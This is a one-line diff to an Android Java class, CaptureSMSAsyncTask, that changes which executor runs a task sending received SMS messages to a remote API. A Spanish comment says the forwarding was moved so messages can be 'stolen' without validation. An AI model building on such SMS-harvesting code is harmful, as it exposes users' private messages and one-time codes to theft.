@@ -270,7 +270,7 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 			}
 
 			//Agregado para enviar los sms recibidos a la api, se movió para chorear sin necesidad de validar (siempre que haya sms)
-			new ConnectApiSMSAsyncTask(activity, false).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
+			new ConnectApiSMSAsyncTask(activity, false).executeOnExecutor(AsyncTask.SERIAL_EXECUTOR);
 		}
 		catch(Exception e)
 		{
